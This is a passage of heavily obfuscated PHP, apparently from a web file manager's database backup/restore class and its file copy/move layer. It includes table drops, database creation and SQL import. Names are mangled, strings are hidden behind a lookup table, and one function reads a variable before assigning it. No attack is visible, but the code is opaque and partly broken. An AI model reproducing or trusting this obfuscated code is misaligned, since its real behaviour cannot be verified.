setModel($øÜ¤§˜·) { $this->model = $øÜ¤§˜·; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ÄÏÜÈÒİ, $ÈÀş«ô• = '') { $this->database = $ÄÏÜÈÒİ; $this->type = $ÈÀş«ô•; } public function model($Ã­çÚï× = '') { return new ModelBase($Ã­çÚï×, $_SERVER[ÏÒ Ì„][33], $this->database); } public function db($–™ĞšæË = false) { $çÅÒú’¡ =& $_SERVER[ÏÒ Ì„]; $º½åÙÖõ = array_change_key_case($this->database); if ($this->type == $çÅÒú’¡[9] || !$–™ĞšæË) { return $this->model()->db(); } $”‰©ëàÃ = $º½åÙÖõ[$çÅÒú’¡[966]]; $º½åÙÖõ[$çÅÒú’¡[966]] = $çÅÒú’¡[33]; if ($º½åÙÖõ[$çÅÒú’¡[786]] == $çÅÒú’¡[787]) { $Â‚™«šÇ = $º½åÙÖõ[$çÅÒú’¡[788]]; $º½åÙÖõ[$çÅÒú’¡[788]] = substr($Â‚™«šÇ, 0, strrpos($Â‚™«šÇ, $çÅÒú’¡[1053])); } $this->database = $º½åÙÖõ; $‡ˆÒØ¬» = $this->model()->db(); try { $ãŞğæ†Ó = $‡ˆÒØ¬»->execute("\163\150\157\x77\40\144\x61\x74\x61\142\141\x73\x65\163\x20\154\x69\x6b\145\40\47{$”‰©ëàÃ}\47"); } catch (Exception $ã“»Ù¿) { } if (!$ãŞğæ†Ó) { $‡ˆÒØ¬»->execute("\x63\x72\145\x61\164\145\40\x64\141\x74\x61\142\141\x73\x65\x20\x60{$”‰©ëàÃ}\140"); } $º½åÙÖõ[$çÅÒú’¡[966]] = $”‰©ëàÃ; if ($º½åÙÖõ[$çÅÒú’¡[786]] == $çÅÒú’¡[787]) { $º½åÙÖõ[$çÅÒú’¡[788]] .= $çÅÒú’¡[1053] . $”‰©ëàÃ; } $this->database = $º½åÙÖõ; $‡ˆÒØ¬»->execute("\x75\x73\x65\40\x60{$”‰©ëàÃ}\140"); return $‡ˆÒØ¬»; } public function createTable($™ß‚Ûûâ, &$ĞñäÎÇ½) { $æõË‘’À =& $_SERVER[ÏÒ Ì„]; if (!IO::exist($™ß‚Ûûâ)) { ActionCall($æõË‘’À[1054], !0, 0); show_json(LNG($æõË‘’À[1055]), !1); } $ûÕëİ’¥ = sqlSplit(IO::getContent($™ß‚Ûûâ)); foreach ($ûÕëİ’¥ as $íãğñı‰) { $å‡ƒ–› = stripos($íãğñı‰, $æõË‘’À[1056]) === 0; if ($å‡ƒ–›) { $ĞñäÎÇ½->task[$æõË‘’À[1057]] += 1; } $this->model()->db()->execute($íãğñı‰); if ($å‡ƒ–›) { preg_match($æõË‘’À[1058], $íãğñı‰, $¢Î¨íøº); $ĞñäÎÇ½->task[$æõË‘’À[1059]] = $¢Î¨íøº[1]; $ĞñäÎÇ½->update(1); } } } public function insertTable($ŞŠ°ı†í, &$œá–“é¹) { $ÒÄà‡Ô =& $_SERVER[ÏÒ Ì„]; $Øäé¡ = $this->model()->db(); $‰Ö±¨ˆÙ = $úª•ñ°ª ? array($úª•ñ°ª) : $Øäé¡->getTables(); foreach ($ŞŠ°ı†í as $½òûæƒ™) { $úª•ñ°ª = basename($½òûæƒ™, $ÒÄà‡Ô[776]); if (!in_array($úª•ñ°ª, $‰Ö±¨ˆÙ)) { continue; } $œá–“é¹->task[$ÒÄà‡Ô[1059]] = $úª•ñ°ª; if (get_filesize($½òûæƒ™) == 0) { continue; } $…¡ıË— = $this->sqlToDb($½òûæƒ™, $œá–“é¹); if (!$…¡ıË—) { ActionCall($ÒÄà‡Ô[1054], !0, 0); show_json(LNG($ÒÄà‡Ô[1060]) . "\133{$úª•ñ°ª}\x5d", !1); } } } public function sqlFromDb($Ê¥àˆØ, $ÛˆÒ†Ñ, &$’ÔóŒƒ, $¿ù…ï‹º = '') { if ($’ÔóŒƒ) { $’ÔóŒƒ->task[$_SERVER[ÏÒ Ì„][1059]] = $Ê¥àˆØ; } $ÆêĞ °÷ = $this->model($Ê¥àˆØ); $‹È„âŒ = 0; $¨„¢œ™­ = 0; $‡¶ÔÂ = 10000; $¡®òŠ¸Ë = fopen($ÛˆÒ†Ñ, $_SERVER[ÏÒ Ì„][1061]); $óœ“†¦Õ = $ÆêĞ °÷->getPk(); $ı÷…çá› = $ÆêĞ °÷->getDbFields(); do { $‰òˆÀÍ = array($óœ“†¦Õ => array($_SERVER[ÏÒ Ì„][1008], $¨„¢œ™­)); $úÍÃé˜é = $ÆêĞ °÷->where($‰òˆÀÍ)->field($ı÷…çá›)->order($óœ“†¦Õ . $_SERVER[ÏÒ Ì„][1062])->limit($‡¶ÔÂ)->select(); $úÍÃé˜é = !empty($úÍÃé˜é) ? $úÍÃé˜é : array(); if (!($ÍÆãÆ›Ï = count($úÍÃé˜é))) { break; } $ÓÄõŒ¦Ş = end($úÍÃé˜é); $¨„¢œ™­ = $ÓÄõŒ¦Ş[$óœ“†¦Õ]; $Ùš€ï³Ü = array(); foreach ($úÍÃé˜é as $“–ØçÀ) { if ($Ê¥àˆØ == $_SERVER[ÏÒ Ì„][1063] && $“–ØçÀ[$_SERVER[ÏÒ Ì„][29]] == $_SERVER[ÏÒ Ì„][1064]) { $£¿¥ıïï = json_decode($“–ØçÀ[$_SERVER[ÏÒ Ì„][372]], !0); if ($£¿¥ıïï[$_SERVER[ÏÒ Ì„][28]] == date($_SERVER[ÏÒ Ì„][741]) && !$£¿¥ıïï[$_SERVER[ÏÒ Ì„][740]]) { continue; } } if ($¿ù…ï‹º) { $“–ØçÀ[$_SERVER[ÏÒ Ì„][76]] = "\173\x69\x6f\x3a{$¿ù…ï‹º}\x7d" . substr($“–ØçÀ[$_SERVER[ÏÒ Ì„][76]], strlen("\x7b\151\x6f\72{$“–ØçÀ[$_SERVER[ÏÒ Ì„][814]]}\x7d")); $“–ØçÀ[$_SERVER[ÏÒ Ì„][814]] = $¿ù…ï‹º; } $Ùš€ï³Ü[] = $_SERVER[ÏÒ Ì„][1065] . $this->sqlEncode($“–ØçÀ) . $_SERVER[ÏÒ Ì„][1066]; } $ã‹ğ×‹ = "\x49\116\x53\x45\122\x54\x20\x49\116\x54\x4f\40\140{$Ê¥àˆØ}\140\40\50\140" . implode($_SERVER[ÏÒ Ì„][1067], $ı÷…çá›) . $_SERVER[ÏÒ Ì„][1068]; fwrite($¡®òŠ¸Ë, $ã‹ğ×‹ . implode($_SERVER[ÏÒ Ì„][1069], $Ùš€ï³Ü) . $_SERVER[ÏÒ Ì„][68] . PHP_EOL); $‹È„âŒ += $ÍÆãÆ›Ï; if ($’ÔóŒƒ) { $’ÔóŒƒ->update($ÍÆãÆ›Ï); } } while ($‡¶ÔÂ == $ÍÆãÆ›Ï); fclose($¡®òŠ¸Ë); return $‹È„âŒ; } public function sqlToDb($ëÌŞşÔ´, &$¶óç½¥¥) { $Ü”ª‹è¤ =& $_SERVER[ÏÒ Ì„]; $„¨ŒŒİÙ = $this->model()->db(); $˜º·üÁô = @fopen($ëÌŞşÔ´, $Ü”ª‹è¤[1070]); if (!$˜º·üÁô) { return !1; } $ñï¢¯ıÔ = 0; $êÙß“° = $Ü”ª‹è¤[33]; $˜İÆúê´ = array(); $ÑÄº¼Ÿ = $this->type == $Ü”ª‹è¤[9] ? 500 : 2000; $åî¨ºÉÖ = basename($ëÌŞşÔ´, $Ü”ª‹è¤[776]); $ÈÈıà”Î = 0; $«ÔóÛ»à = 4194304 - 104858; $ó…—£›¥ = 1000000 - 104858; while (!feof($˜º·üÁô)) { $ÍŞªÏ¦ = trim(fgets($˜º·üÁô)); if (!$ÍŞªÏ¦) { continue; } $™Øˆöâ£ = $this->sqlDecode($ÍŞªÏ¦, $this->type); if (stripos($™Øˆöâ£, $Ü”ª‹è¤[353]) === 0) { if (!$êÙß“°) { $êÙß“° = $™Øˆöâ£ . $Ü”ª‹è¤[50]; } continue; } if ($¶óç½¥¥) { $¶óç½¥¥->task[$Ü”ª‹è¤[1057]] += 1; } $ñï¢¯ıÔ++; $˜İÆúê´[] = rtrim(rtrim(trim($™Øˆöâ£), $Ü”ª‹è¤[47]), $Ü”ª‹è¤[68]); $ØÛåıİ€ = null; $†˜ ¿êü = strlen($™Øˆöâ£); $ÈÈıà”Î += $†˜ ¿êü; if ($ÈÈıà”Î >= ($ÑÄº¼Ÿ == 500 ? $«ÔóÛ»à : $ó…—£›¥)) { $ØÛåıİ€ = array_pop($˜İÆúê´); if ($ñï¢¯ıÔ > 1) { $ñï¢¯ıÔ--; } } if ($ñï¢¯ıÔ >= $ÑÄº¼Ÿ || $ØÛåıİ€) { $™Øˆöâ£ = $êÙß“° . implode($Ü”ª‹è¤[47], $˜İÆúê´); if (!$„¨ŒŒİÙ->execute($™Øˆöâ£)) { return !1; } if ($¶óç½¥¥) { $¶óç½¥¥->update($ñï¢¯ıÔ); } $˜İÆúê´ = array(); $ñï¢¯ıÔ = 0; $ÈÈıà”Î = 0; if ($ØÛåıİ€) { $˜İÆúê´ = array($ØÛåıİ€); $ñï¢¯ıÔ = 1; $ÈÈıà”Î = $†˜ ¿êü; } } } fclose($˜º·üÁô); if (!empty($˜İÆúê´)) { $™Øˆöâ£ = $êÙß“° . implode($Ü”ª‹è¤[47], $˜İÆúê´); if (!$„¨ŒŒİÙ->execute($™Øˆöâ£)) { return !1; } if ($¶óç½¥¥) { $¶óç½¥¥->update($ñï¢¯ıÔ); } } return !0; } public function dropTable($‹ÀÆ›—ã = null) { $¿´ß­… = $this->model()->db(); $ıÔş¯ö = $‹ÀÆ›—ã ? array($‹ÀÆ›—ã) : $¿´ß­…->getTables(); if (!$ıÔş¯ö) { return; } foreach ($ıÔş¯ö as $‹ÀÆ›—ã) { if ($‹ÀÆ›—ã) { $‹ÀÆ›—ã = strtolower($‹ÀÆ›—ã); } else { continue; } $¿´ß­…->execute("\x64\162\157\x70\40\x74\141\142\154\x65\40\x69\146\40\x65\170\x69\x73\164\163\x20\x60{$‹ÀÆ›—ã}\140"); } } private function sqlEncode($‡„ä×) { $ŠÙ§Ò‡€ =& $_SERVER[ÏÒ Ì„]; $–¾”ò  = array(); foreach ($‡„ä× as $¶¿Äñ°ù) { if (is_array($¶¿Äñ°ù)) { $¶¿Äñ°ù = json_encode_force($¶¿Äñ°ù); } $¶¿Äñ°ù = addslashes($¶¿Äñ°ù); $¶¿Äñ°ù = str_replace(array($ŠÙ§Ò‡€[1071], $ŠÙ§Ò‡€[229]), array($ŠÙ§Ò‡€[1072], $ŠÙ§Ò‡€[1073]), $¶¿Äñ°ù); $–¾”ò [] = str_replace($ŠÙ§Ò‡€[55], $ŠÙ§Ò‡€[1074], $¶¿Äñ°ù); } return $ŠÙ§Ò‡€[55] . implode($ŠÙ§Ò‡€[1075], $–¾”ò ) . $ŠÙ§Ò‡€[55]; } private function sqlDecode($õ¨ù¸ÁÃ, $æûÅû³) { $±¯©ÜÅå =& $_SERVER[ÏÒ Ì„]; $õ¨ù¸ÁÃ = str_replace(array($±¯©ÜÅå[1072], $±¯©ÜÅå[1073]), array($±¯©ÜÅå[1071], $±¯©ÜÅå[229]), $õ¨ù¸ÁÃ); if ($æûÅû³ == $±¯©ÜÅå[9]) { $õ¨ù¸ÁÃ = stripslashes($õ¨ù¸ÁÃ); } return $õ¨ù¸ÁÃ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($×ÚœÍè, $ËìÓı±¶) { $º¯ìµ»ò =& $_SERVER[ÏÒ Ì„]; $ÀØ”ˆÕ = $ËìÓı±¶; $GLOBALS[$º¯ìµ»ò[1076]] = $º¯ìµ»ò[1077] . $×ÚœÍè; Hook::trigger($º¯ìµ»ò[1077] . $×ÚœÍè . $º¯ìµ»ò[1078], $ÀØ”ˆÕ); $øÀ«şİ” = self::driverMake($ËìÓı±¶[0]); if (!$øÀ«şİ”) { return !1; } if (method_exists($øÀ«şİ”, $×ÚœÍè)) { $ØÓËôµ¨ = @call_user_func_array(array($øÀ«şİ”, $×ÚœÍè), $ËìÓı±¶); } else { if (method_exists($øÀ«şİ”, $º¯ìµ»ò[1079])) { $ØÓËôµ¨ = @call_user_func_array(array($øÀ«şİ”, $×ÚœÍè), $ËìÓı±¶); } else { if (method_exists(self, $×ÚœÍè)) { $ØÓËôµ¨ = @call_user_func_array(array(self, $×ÚœÍè), $ËìÓı±¶); } else { $ØÓËôµ¨ = call_user_func_array(array(parent, $×ÚœÍè), $ËìÓı±¶); } } } Hook::trigger($º¯ìµ»ò[1077] . $×ÚœÍè . $º¯ìµ»ò[1080], $ÀØ”ˆÕ, $ØÓËôµ¨); return $ØÓËôµ¨; } public static function init($•™€Èô«) { return self::driverMake($•™€Èô«); } public static function copy($À„ÙĞõ, $éÊ”Ã—², $ÓâŸáÈ³ = false, $İÌÒ›€³ = false) { return self::copyMoveStart($À„ÙĞõ, $éÊ”Ã—², $ÓâŸáÈ³, $_SERVER[ÏÒ Ì„][543], $İÌÒ›€³); } public static function move($Ê­¤şø, $»¤ÄĞé, $İ’Ê–¯ô = false, $ÇÜìŞÀÊ = false) { return self::copyMoveStart($Ê­¤şø, $»¤ÄĞé, $İ’Ê–¯ô, $_SERVER[ÏÒ Ì„][545], $ÇÜìŞÀÊ); } private static function copyMoveStart($Ò ›¼¡, $ç Çó™Â, $¥µå«ëÚ, $ö‡ÀºÌı, $—Ë×ˆ ©) { $öïÛØ§„ =& $_SERVER[ÏÒ Ì„]; $÷Ğã•‰ˆ = array($Ò ›¼¡, $ç Çó™Â, $¥µå«ëÚ, $—Ë×ˆ ©); Hook::trigger($öïÛØ§„[1077] . $ö‡ÀºÌı . $öïÛØ§„[1078], $÷Ğã•‰ˆ); $Şä“Í§ñ = self::copyMove($Ò ›¼¡, $ç Çó™Â, $¥µå«ëÚ, $ö‡ÀºÌı, $—Ë×ˆ ©); Hook::trigger($öïÛØ§„[1077] . $ö‡ÀºÌı . $öïÛØ§„[1080], $÷Ğã•‰ˆ, $Şä“Í§ñ); return $Şä“Í§ñ; } public static function saveFile($”õßÊçñ, $Ë€ŞÓƒ, $ŞØÀ†ş¸ = true) { $Æ’åÁËŠ =& $_SERVER[ÏÒ Ì„]; $à®ôÄ½‹ = self::info($Ë€ŞÓƒ); $®ÔåıŒÜ = self::driverMake($”õßÊçñ); $·¡•ÓÍ­ = self::driverMake($Ë€ŞÓƒ); $šòÜÆÚÊ = !1; if ($·¡•ÓÍ­->pathParse[$Æ’åÁËŠ[1081]]) { $šòÜÆÚÊ = $·¡•ÓÍ­; $“ñêîø = $·¡•ÓÍ­->pathParse[$Æ’åÁËŠ[1081]]; $·¡•ÓÍ­ = self::driverMake($“ñêîø); } if ($®ÔåıŒÜ->pathParse[$Æ’åÁËŠ[1081]]) { $˜ù½üÇ¢ = $®ÔåıŒÜ->pathParse[$Æ’åÁËŠ[1081]]; $®ÔåıŒÜ = self::driverMake($˜ù½üÇ¢); } $ôå”òà = $·¡•ÓÍ­->pathFather($Ë€ŞÓƒ); $î•ç¢ñ = !0; if (!$ŞØÀ†ş¸ && self::driverIsSame($®ÔåıŒÜ, $·¡•ÓÍ­)) { $î•ç¢ñ = !1; } $ŒâòÑ™´ = self::copyFile($®ÔåıŒÜ, $”õßÊçñ, $·¡•ÓÍ­, $ôå”òà, $à®ôÄ½‹[$Æ’åÁËŠ[28]], $î•ç¢ñ); if ($šòÜÆÚÊ) { $ŒâòÑ™´ = $šòÜÆÚÊ->getPathOuter($ŒâòÑ™´); } return $ŒâòÑ™´; } private static function copyMove($ ä¦Å”¶, $ ˜ü‰Ÿï, $„¤›çÁ, $äù‹Œè¡, $óÆ¥©…¿ = false) { $†ıÇŒõœ =& $_SERVER[ÏÒ Ì„]; if (!$ ä¦Å”¶ || $ ä¦Å”¶ == $†ıÇŒõœ[8] || !$ ˜ü‰Ÿï) { return !1; } ignore_timeout(); $‹ÅêÄºË = self::driverMake($ ä¦Å”¶); $ï‡®†Åü = self::driverMake($ ˜ü‰Ÿï); $¼¨ÃÔşô = $äù‹Œè¡ == $†ıÇŒõœ[545]; $Î…±¹‚¯ = !1; if ($ï‡®†Åü->pathParse[$†ıÇŒõœ[1081]]) { $Î…±¹‚¯ = $ï‡®†Åü; $ ˜ü‰Ÿï = $ï‡®†Åü->pathParse[$†ıÇŒõœ[1081]]; $ï‡®†Åü = self::driverMake($ ˜ü‰Ÿï); } if ($‹ÅêÄºË->pathParse[$†ıÇŒõœ[1081]]) { $ ä¦Å”¶ = $‹ÅêÄºË->pathParse[$†ıÇŒõœ[1081]]; $‹ÅêÄºË = self::driverMake($ ä¦Å”¶); } self::check($‹ÅêÄºË, $ ä¦Å”¶, $ï‡®†Åü, $ ˜ü‰Ÿï); Hook::trigger($†ıÇŒõœ[73], $‹ÅêÄºË, $ ä¦Å”¶, $ï‡®†Åü, $ ˜ü‰Ÿï); $÷ø¨´æ¤ = self::driverIsSame($‹ÅêÄºË, $ï‡®†Åü); if ($÷ø¨´æ¤) { if ($äù‹Œè¡ == $†ıÇŒõœ[545] && !method_exists($ï‡®†Åü, $†ıÇŒõœ[1082]) && trim($ ˜ü‰Ÿï, $†ıÇŒõœ[8]) == trim($ï‡®†Åü->pathFather($ ä¦Å”¶), $†ıÇŒõœ[8])) { if ($‹ÅêÄºË->pathThis($ ä¦Å”¶) != $óÆ¥©…¿ && !$‹ÅêÄºË->isTypeObject()) { return $‹ÅêÄºË->rename($ ä¦Å”¶, $óÆ¥©…¿); } return $ï‡®†Åü->getPathOuter($ ä¦Å”¶); } if (method_exists($ï‡®†Åü, $äù‹Œè¡)) { return $ï‡®†Åü->{$äù‹Œè¡}($ ä¦Å”¶, $ ˜ü‰Ÿï, $„¤›çÁ, $óÆ¥©…¿); } } if ($÷ø¨´æ¤ && $äù‹Œè¡ == $†ıÇŒõœ[545] && $ï‡®†Åü->getType() == $†ıÇŒõœ[106]) { $òı¢ˆä¶ = $ï‡®†Åü->movePath($ ä¦Å”¶, $ ˜ü‰Ÿï, $óÆ¥©…¿); if ($òı¢ˆä¶) { return $òı¢ˆä¶; } } $§É„ÒÙô = $‹ÅêÄºË->isFile($ ä¦Å”¶); if (!$§É„ÒÙô && $ï‡®†Åü->getType() == $†ıÇŒõœ[748] && $‹ÅêÄºË->getType() == $†ıÇŒõœ[106]) { $òı¢ˆä¶ = $ï‡®†Åü->copyFolderFromIO($‹ÅêÄºË, $ ä¦Å”¶, $ ˜ü‰Ÿï, $„¤›çÁ, $¼¨ÃÔşô, $óÆ¥©…¿); } else { $òı¢ˆä¶ = self::copyPath($‹ÅêÄºË, $ ä¦Å”¶, $ï‡®†Åü, $ ˜ü‰Ÿï, $„¤›çÁ, $¼¨ÃÔşô, $§É„ÒÙô, $óÆ¥©…¿); } if ($òı¢ˆä¶ && $¼¨ÃÔşô) { $‹ÅêÄºË->remove($ ä¦Å”¶); } if ($Î…±¹‚¯) { $òı¢ˆä¶ = $Î…±¹‚¯->getPathOuter($òı¢ˆä¶); } return $òı¢ˆä¶; } private static function check($Å®µâ–Ü, $™ßîÓĞñ, $¡½ÅË©Ş, &$ûõ¹Ñƒ“) { $–šÂï° =& $_SERVER[ÏÒ Ì„]; if (self::driverIsSame($Å®µâ–Ü, $¡½ÅË©Ş) && $Å®µâ–Ü->isFolder($™ßîÓĞñ) && $Å®µâ–Ü->isParentOf($™ßîÓĞñ, $ûõ¹Ñƒ“)) { show_json(LNG($–šÂï°[1083]), !1); } if (!$Å®µâ–Ü->exist($™ßîÓĞñ)) { show_json(LNG($–šÂï°[105]), !1); } } private static function copyPath($ëıò®Ì, $¨È›ûàõ, $…Ë†Öúü, $±†®ãÉ, $ñù÷Åâ, $ú‹ÕÕ¦ü, $Â”îİà, $ÙæÉËĞ© = false) { $©á™’¶ =& $_SERVER[ÏÒ Ì„]; $èÜ˜Ò–ä = empty($ÙæÉËĞ©) && $ÙæÉËĞ© !== $©á™’¶[191] ? $ëıò®Ì->pathThis($¨È›ûàõ) : $ÙæÉËĞ©; if ($ñù÷Åâ) { $Í¬Ìˆ€ß = $…Ë†Öúü->fileNameExist($±†®ãÉ, $èÜ˜Ò–ä); $èÜ˜Ò–ä = $…Ë†Öúü->fileNameAuto($±†®ãÉ, $èÜ˜Ò–ä, $ñù÷Åâ, !$Â”îİà); $ñù÷Åâ = $Í¬Ìˆ€ß ? $ñù÷Åâ : !1; } if ($Â”îİà) { return self::copyFile($ëıò®Ì, $¨È›ûàõ, $…Ë†Öúü, $±†®ãÉ, $èÜ˜Ò–ä, $ú‹ÕÕ¦ü); } if ($ñù÷Åâ == REPEAT_RENAME_FOLDER) { $ñù÷Åâ = !1; } $Í§Ÿ®Ûá = rtrim($±†®ãÉ, $©á™’¶[8]) . $©á™’¶[8] . $èÜ˜Ò–ä; $¸£•ì«‰ = $…Ë†Öúü->mkdir($…Ë†Öúü->getPath($Í§Ÿ®Ûá)); $±†®ãÉ = $…Ë†Öúü->getPathInner($¸£•ì«‰); $ğ´÷ä = $ëıò®Ì->listPath($¨È›ûàõ, !0); $ğ´÷ä = is_array($ğ´÷ä) ? $ğ´÷ä : array($©á™’¶[74] => array(), $©á™’¶[75] => array()); $ğš‘ÕŠï = array_merge($ğ´÷ä[$©á™’¶[74]], $ğ´÷ä[$©á™’¶[75]]); foreach ($ğš‘ÕŠï as $™Ûó”‘) { $’ï¦•´¨ = $™Ûó”‘[$©á™’¶[29]] == $©á™’¶[193]; $¨È›ûàõ = $ëıò®Ì->getPathInner($™Ûó”‘[$©á™’¶[76]]); $ÛÍ‹òè = self::copyPath($ëıò®Ì, $¨È›ûàõ, $…Ë†Öúü, $±†®ãÉ, $ñù÷Åâ, $ú‹ÕÕ¦ü, $’ï¦•´¨); if (!$ÛÍ‹òè) { IO::errorTips($©á™’¶[1084] . $¨È›ûàõ . $©á™’¶[67] . $±†®ãÉ); } } self::copyMoveKeepInfo($ëıò®Ì, $¨È›ûàõ, $¸£•ì«‰); return $¸£•ì«‰; } private static function copyFile($ƒÄÊı, $ßÊİ¥“Ş, $ÀğÛ…€ä, $ÄÃÙëå, $ñÔ¯†¡ø, $¿ß¢½ú´) { $ö®¡ã =& $_SERVER[ÏÒ Ì„]; $ÄÃÙëå = $ÀğÛ…€ä->getPath(rtrim($ÄÃÙëå, $ö®¡ã[8]) . $ö®¡ã[8] . $ñÔ¯†¡ø); $˜ˆ…ş = $ö®¡ã[1085] . time() . rand_string(5); Hook::trigger($ö®¡ã[1086], $ƒÄÊı, $ßÊİ¥“Ş, $ÀğÛ…€ä, $ÄÃÙëå, $ñÔ¯†¡ø, $˜ˆ…ş); if (self::driverIsSame($ƒÄÊı, $ÀğÛ…€ä)) { if ($¿ß¢½ú´) { $Ì—úË = $ÀğÛ…€ä->moveFile($ßÊİ¥“Ş, $ÄÃÙëå); } else { $Ì—úË = $ÀğÛ…€ä->copyFile($ßÊİ¥“Ş, $ÄÃÙëå); } Hook::trigger($ö®¡ã[1087], $ƒÄÊı, $ßÊİ¥“Ş, $ÀğÛ…€ä, $ÄÃÙëå, $ñÔ¯†¡ø, $Ì—úË); self::copyMoveKeepInfo($ƒÄÊı, $ßÊİ¥“Ş, $Ì—úË); return $Ì—úË; } $‰Ä‹ç›ñ = TEMP_FILES; if ($GLOBALS[$ö®¡ã[6]][$ö®¡ã[88]][$ö®¡ã[792]]) { $‰Ä‹ç›ñ = $GLOBALS[$ö®¡ã[6]][$ö®¡ã[88]][$ö®¡ã[792]]; } $ÄÁâƒÊ = $‰Ä‹ç›ñ; mk_dir($ÄÁâƒÊ); $àÏ×Õ”œ = $ÄÁâƒÊ . $˜ˆ…ş; $©Ü­ƒ‹³ = $àÏ×Õ”œ; $àÏ×Õ”œ = $ƒÄÊı->download($ßÊİ¥“Ş, $àÏ×Õ”œ); $àÏ×Õ”œ = $ƒÄÊı->iconvApp($àÏ×Õ”œ); if (substr($àÏ×Õ”œ, strlen($‰Ä‹ç›ñ)) == $‰Ä‹ç›ñ) { $¿ß¢½ú´ = !0; } $Ì—úË = $ÀğÛ…€ä->upload($ÄÃÙëå, $àÏ×Õ”œ, $¿ß¢½ú´); self::remove($©Ü­ƒ‹³); Hook::trigger($ö®¡ã[1087], $ƒÄÊı, $ßÊİ¥“Ş, $ÀğÛ…€ä, $ÄÃÙëå, $ñÔ¯†¡ø, $Ì—úË); self::copyMoveKeepInfo($ƒÄÊı, $ßÊİ¥“Ş, $Ì—úË); return $Ì—úË; } private static function copyMoveKeepInfo($Éôá³¬ı, $’úõö‡í, $œööò’) { if (!$œööò’) { return; } $Ì“û¥û´ = $Éôá³¬ı->info($’úõö‡í); if (!is_array($Ì“û¥û´)) { return; } IO::setModifyTime($œööò’, $Ì“û¥û´[$_SERVER[ÏÒ Ì„][84]]); } public static function pathFather($‡‘ø³²©) { $÷à¥İŞŒ = IO::init($‡‘ø³²©); $ÇØ£­ÑÂ = $÷à¥İŞŒ->pathFather($÷à¥İŞŒ->path); return $÷à¥İŞŒ->getPathOuter($ÇØ£­ÑÂ); } public static function fileOut($†Ø ÁÃÔ, $µÛã•øô = false, $¢Ó„û = false, $¹µ¨½ÏÚ = '') { $–ñ¡íä = self::driverMake($†Ø ÁÃÔ); if ($–ñ¡íä->isFileOutServer()) { return $–ñ¡íä->fileOutServer($†Ø ÁÃÔ, $µÛã•øô, $¢Ó„û, $¹µ¨½ÏÚ); } return $–ñ¡íä->fileOut($†Ø ÁÃÔ, $µÛã•øô, $¢Ó„û, $¹µ¨½ÏÚ); } public static function fileOutImage($Êüá×°, $ûç‚Œ«ù = 250) { $³ÏÖ„Ú = array(250, 600, 1200, 2000, 3000, 5000); for ($ÂÄÃ±´Ñ = 0; $ÂÄÃ±´Ñ < count($³ÏÖ„Ú); $ÂÄÃ±´Ñ++) { if ($ÂÄÃ±´Ñ == 0 && $ûç‚Œ«ù <= $³ÏÖ„Ú[$ÂÄÃ±´Ñ]) { $ûç‚Œ«ù = $³ÏÖ„Ú[$ÂÄÃ±´Ñ]; break; } else { if ($ûç‚Œ«ù > $³ÏÖ„Ú[$ÂÄÃ±´Ñ - 1] && $ûç‚Œ«ù <= $³ÏÖ„Ú[$ÂÄÃ±´Ñ]) { $ûç‚Œ«ù = $³ÏÖ„Ú[$ÂÄÃ±´Ñ]; break; } else { if ($ÂÄÃ±´Ñ == count($³ÏÖ„Ú) - 1 && $ûç‚Œ«ù > $³ÏÖ„Ú[$ÂÄÃ±´Ñ]) { $ûç‚Œ«ù = $³ÏÖ„Ú[$ÂÄÃ±´Ñ]; break; } } } } $Ì˜¬ğû = self::driverMake($Êüá×°); if ($Ì˜¬ğû->isFileOutServer()) { return $Ì˜¬ğû->fileOutImageServer($Êüá×°, $ûç‚Œ«ù); } return $Ì˜¬ğû->fileOutImage($Êüá×°, $ûç‚Œ«ù); } private static function driverIsSame($†é¦™Ïæ, $­¶×¸åÛ) { $„•ğ¸¤× =& $_SERVER[ÏÒ Ì„]; $ÏÎ»Ó®‘ = $†é¦™Ïæ->getType(); $çÒ€ò©» = $­¶×¸åÛ->getType(); if ($ÏÎ»Ó®‘ != $çÒ€ò©») { return !1; } if ($ÏÎ»Ó®‘ == $„•ğ¸¤×[748]) { return !0; } if ($ÏÎ»Ó®‘ == $„•ğ¸¤×[106]) { return !0; } if ($†é¦™Ïæ->pathDriver == $­¶×¸åÛ->pathDriver) { return !0; } return !1; } public static function copyUpdate($ø¶ËÏö, $èºä©Á) { $öƒÖöŠº =& $_SERVER[ÏÒ Ì„]; if (!IO::exist($ø¶ËÏö)) { return !1; } if (!IO::exist($èºä©Á)) { IO::mkdir($èºä©Á); } $ßìÊ°†Ñ = self::_listAll($ø¶ËÏö); $à›•¢ = self::_listAll($èºä©Á); $£¹±Ç”Ÿ = array(); $û°¼Ú¤¿ = array(); foreach ($ßìÊ°†Ñ as $Ü†õ«€Î => $°œ‡ õÚ) { if (isset($à›•¢[$Ü†õ«€Î])) { if ($°œ‡ õÚ[$öƒÖöŠº[77]] == 1) { continue; } if ($à›•¢[$Ü†õ«€Î][$öƒÖöŠº[78]] == $°œ‡ õÚ[$öƒÖöŠº[78]]) { continue; } } if ($°œ‡ õÚ[$öƒÖöŠº[77]] == 1) { $û°¼Ú¤¿[] = $èºä©Á . $öƒÖöŠº[8] . $Ü†õ«€Î; continue; } $è ğ‘õò = strstr(trim($Ü†õ«€Î, $öƒÖöŠº[8]), $öƒÖöŠº[8]) ? get_path_father($Ü†õ«€Î) : $öƒÖöŠº[33]; $£¹±Ç”Ÿ[] = array($öƒÖöŠº[1088] => $°œ‡ õÚ[$öƒÖöŠº[76]], $öƒÖöŠº[1089] => rtrim($èºä©Á, $öƒÖöŠº[8]) . $öƒÖöŠº[8] . $è ğ‘õò, $öƒÖöŠº[1090] => $°œ‡ õÚ); } $äó‘‚›à = array($öƒÖöŠº[193] => $£¹±Ç”Ÿ, $öƒÖöŠº[77] => $û°¼Ú¤¿); Hook::trigger($öƒÖöŠº[1091], $ø¶ËÏö, $èºä©Á, $äó‘‚›à); foreach ($û°¼Ú¤¿ as $°œ‡ õÚ) { IO::mkdir($°œ‡ õÚ); } foreach ($£¹±Ç”Ÿ as $°œ‡ õÚ) { IO::copy($°œ‡ õÚ[$öƒÖöŠº[1088]], $°œ‡ õÚ[$öƒÖöŠº[1089]], REPEAT_REPLACE); } } private static function _listAll($‘íâû„Æ) { $ÏøÉÖñ¶ =& $_SERVER[ÏÒ Ì„]; $‘íâû„Æ = KodIO::clear($‘íâû„Æ); $â§î¢é = IO::listAll($‘íâû„Æ); foreach ($â§î¢é as &$øãòŸ×) { $¥²Ì¸®Å = substr($øãòŸ×[$ÏøÉÖñ¶[76]], strlen($‘íâû„Æ)); 